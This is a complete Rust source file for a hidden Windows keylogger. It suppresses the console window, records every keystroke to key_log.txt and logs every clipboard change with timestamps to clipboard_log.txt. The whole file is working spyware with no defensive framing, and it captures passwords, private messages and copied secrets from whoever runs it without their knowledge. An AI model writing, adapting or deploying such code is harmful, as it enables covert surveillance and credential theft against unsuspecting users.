#![windows_subsystem = "windows"]
extern crate winapi;

use std::collections::HashMap;
use std::ffi::OsString;
use std::fs::OpenOptions;
use std::io::Write;
use std::os::windows::ffi::OsStringExt;
use std::ptr::null_mut;
use std::thread;
use std::time::Duration;
use winapi::shared::minwindef::{BYTE, HGLOBAL, LPVOID};
use winapi::shared::windef::HWND;
use winapi::um::winbase::{GlobalLock, GlobalUnlock};
use winapi::um::winuser::{
    CloseClipboard, GetAsyncKeyState, GetClipboardData, GetKeyboardState,
    IsClipboardFormatAvailable, MapVirtualKeyW, OpenClipboard, ToUnicode, CF_UNICODETEXT, VK_BACK,
    VK_RETURN, VK_SPACE, VK_TAB,
};

fn log_keys(key_log_file: String) {
    thread::spawn(move || {
        let mut key_states: HashMap<i32, bool> = HashMap::new();

        loop {
            for key in 0..255 {
                let key_state = unsafe { GetAsyncKeyState(key) } & (0x8000u16 as i16) != 0;
                let prev_state = *key_states.get(&key).unwrap_or(&false);

                if key_state && !prev_state {
                    let mut file = OpenOptions::new()
                        .create(true)
                        .append(true)
                        .open(&key_log_file)
                        .expect("Failed to open key log file");

                    let key_char = get_char_from_keycode(key);

                    if let Some(c) = key_char {
                        file.write_all(c.as_bytes())
                            .expect("Failed to write to key log file");
                    }
                }

                key_states.insert(key, key_state);
            }
            thread::sleep(Duration::from_millis(10));
        }
    });
}

fn get_char_from_keycode(vk_code: i32) -> Option<String> {
    let mut buffer = [0u16; 8];
    let keyboard_state = get_keyboard_state();

    let scan_code = unsafe { MapVirtualKeyW(vk_code as u32, 0) };

    let result = unsafe {
        ToUnicode(
            vk_code as u32,
            scan_code,
            keyboard_state.as_ptr(),
            buffer.as_mut_ptr(),
            buffer.len() as i32,
            0,
        )
    };

    if result > 0 {
        let os_string = OsString::from_wide(&buffer[..result as usize]);
        let string = os_string.to_string_lossy().into_owned();
        Some(string)
    } else {
        match vk_code {
            VK_BACK => Some("[Backspace]".to_string()),
            VK_RETURN => Some("\n".to_string()),
            VK_SPACE => Some(" ".to_string()),
            VK_TAB => Some("\t".to_string()),
            _ => None,
        }
    }
}

fn get_keyboard_state() -> [BYTE; 256] {
    let mut keyboard_state = [0u8; 256];
    unsafe {
        GetKeyboardState(keyboard_state.as_mut_ptr());
    }
    keyboard_state
}

fn log_clipboard(clipboard_log_file: String) {
    thread::spawn(move || {
        let mut last_clipboard_content = String::new();

        loop {
            if let Some(current_clipboard_content) = get_clipboard_text() {
                if current_clipboard_content != last_clipboard_content {
                    last_clipboard_content = current_clipboard_content.clone();

                    let mut file = OpenOptions::new()
                        .create(true)
                        .append(true)
                        .open(&clipboard_log_file)
                        .expect("Failed to open clipboard log file");

                    file.write_all(
                        format!(
                            "[{}] Clipboard Change Detected:\n{}\n\n",
                            chrono::Local::now().format("%Y-%m-%d %H:%M:%S"),
                            current_clipboard_content
                        )
                        .as_bytes(),
                    )
                    .expect("Failed to write to clipboard log file");
                }
            }
            thread::sleep(Duration::from_millis(500));
        }
    });
}

fn get_clipboard_text() -> Option<String> {
    unsafe {
        let hwnd: HWND = null_mut();
        if OpenClipboard(hwnd) == 0 {
            return None;
        }

        if IsClipboardFormatAvailable(CF_UNICODETEXT) == 0 {
            CloseClipboard();
            return None;
        }

        let h_clip_data: HGLOBAL = GetClipboardData(CF_UNICODETEXT);
        if h_clip_data.is_null() {
            CloseClipboard();
            return None;
        }

        let ptr: LPVOID = GlobalLock(h_clip_data);
        if ptr.is_null() {
            CloseClipboard();
            return None;
        }

        let mut len = 0;
        while *(ptr as *const u16).add(len) != 0 {
            len += 1;
        }

        let slice = std::slice::from_raw_parts(ptr as *const u16, len);
        let clipboard_text = OsString::from_wide(slice).to_string_lossy().into_owned();

        GlobalUnlock(h_clip_data);
        CloseClipboard();

        Some(clipboard_text)
    }
}

fn main() {
    let key_log_file = "key_log.txt".to_string();
    let clipboard_log_file = "clipboard_log.txt".to_string();

    log_keys(key_log_file);
    log_clipboard(clipboard_log_file);

    loop {
        thread::sleep(Duration::from_secs(1));
    }
}
